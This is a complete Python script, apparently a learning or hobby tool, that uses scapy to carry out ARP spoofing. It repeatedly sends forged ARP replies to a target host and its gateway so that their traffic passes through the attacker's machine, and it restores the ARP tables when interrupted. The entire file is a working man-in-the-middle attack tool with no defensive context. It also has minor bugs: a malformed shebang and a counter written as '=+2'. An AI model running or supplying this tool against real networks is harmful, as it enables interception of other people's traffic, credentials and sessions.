#!usr/bin/env python

import scapy.all as scapy
import argparse
import time
import re

def get_arguments():
	parser = argparse.ArgumentParser()
	parser.add_argument("-t", "--target", dest="target_ip", help="Target IP")
	parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP")
	options = parser.parse_args()
	if not options.target_ip:
		parser.error("[-] Please specify a target ip using -t or --target option") 
	if not options.gateway_ip:
		parser.error("[-] Please specify a gateway ip using -g or --gateway option")
	if not re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", options.target_ip):
		parser.error("[-] Invalid target IP address")
	if not re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", options.gateway_ip):
		parser.error("[-] Invalid gateway IP address")
	return options

def get_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request
	answerd_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
	return answerd_list[0][1].hwsrc


def spoof(target_ip, router_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
	scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
	destination_mac = get_mac(destination_ip)
	source_mac = get_mac(source_ip)
	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
	scapy.send(packet, count=4, verbose=False)


options = get_arguments()
target_ip = options.target_ip
gateway_ip = options.gateway_ip
packet_count = 0
try:
	while True:
		spoof(target_ip, gateway_ip)
		spoof(gateway_ip, target_ip)
		packet_count=+2
		print("\r[+] packets sent: "+str(packet_count), end="")
		time.sleep(2)
except KeyboardInterrupt:
	restore(target_ip, gateway_ip)
	restore(gateway_ip, target_ip)
	print("\n [-] Detected CTRL+C, Resetting ARP tables and quiting...")